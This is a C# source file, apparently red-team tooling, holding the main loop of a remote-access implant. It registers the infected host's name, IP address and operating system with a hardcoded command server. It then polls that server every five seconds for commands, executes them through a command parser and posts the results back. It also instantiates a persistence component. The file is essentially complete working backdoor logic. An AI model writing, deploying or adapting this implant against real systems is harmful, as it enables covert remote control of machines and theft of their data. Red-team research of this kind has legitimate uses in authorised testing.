using System;

namespace RedTeamDevelop {
    class Program {
        static void Main(string[] args) {
            GeneralInfo infoObject = new GeneralInfo();
            Persistence persObj = new Persistence(infoObject);
            Operations opsObj = new Operations(infoObject);
            
            string commandUrl = "http://192.168.29.234/getcommand.php";
            string registerUrl = "http://192.168.29.234/register.php";
            string getResults = "http://192.168.29.234/getresults.php";
            System.Net.WebClient webObj = new System.Net.WebClient();
            int execeptionCounter = 0;

            string parameters = "hostname=" + infoObject.hostname + "&ip=" + infoObject.ipv4address + "&operatingsystem=" + infoObject.oSystem;
            webObj.Headers.Add("Content-Type", "application/x-www-form-urlencoded");

            webObj.UploadString(registerUrl, parameters);

            while(true) {

                if (execeptionCounter > 19) {
                    break;
                }

                try{
                    webObj.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                    string takenCommand = webObj.UploadString(commandUrl, parameters);
                    if (takenCommand.Length > 1) {
                        string commandResult = opsObj.CommandParser(takenCommand);
                        string resultParameters = "hostname=" + infoObject.hostname + "&ip=" + infoObject.ipv4address + "&result=" + commandResult;
                        webObj.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                        webObj.UploadString(getResults, resultParameters);
                    }
                    System.Threading.Thread.Sleep(5000);
                    execeptionCounter = 0;
                } catch {
                    System.Threading.Thread.Sleep(5000);
                    execeptionCounter += 1;
                }
            }
        }
    }
}